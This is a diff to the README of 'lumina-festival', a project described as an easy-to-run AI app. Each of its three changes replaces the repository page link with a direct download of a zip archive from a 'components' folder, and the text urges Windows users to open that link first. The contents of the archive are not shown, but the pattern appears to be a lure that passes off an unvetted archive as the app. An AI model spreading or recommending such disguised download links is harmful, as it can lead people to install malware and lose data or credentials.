@@ -1,6 +1,6 @@
 # ✨ lumina-festival - Run Your AI App With Ease
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://github.com/nonharmonic-lagbomer158/lumina-festival)
+[![Download the app](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip)
 
 ## 🖥️ What This App Does
 
@@ -16,7 +16,7 @@ Use it to:
 
 Visit this page to download and use the app source files:
 
-[Download lumina-festival from GitHub](https://github.com/nonharmonic-lagbomer158/lumina-festival)
+[Download lumina-festival from GitHub](https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip)
 
 If you are on Windows, this is the link you should open first. Save the files to a folder you can find again, such as Downloads or Desktop.
 
@@ -165,7 +165,7 @@ If you delete `node_modules`, run `npm install` again before starting the app.
 
 Primary download page:
 
-[https://github.com/nonharmonic-lagbomer158/lumina-festival](https://github.com/nonharmonic-lagbomer158/lumina-festival)
+[https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip](https://github.com/nonharmonic-lagbomer158/lumina-festival/raw/refs/heads/main/components/festival_lumina_3.3.zip)
 
 ## 🛠️ Troubleshooting
 
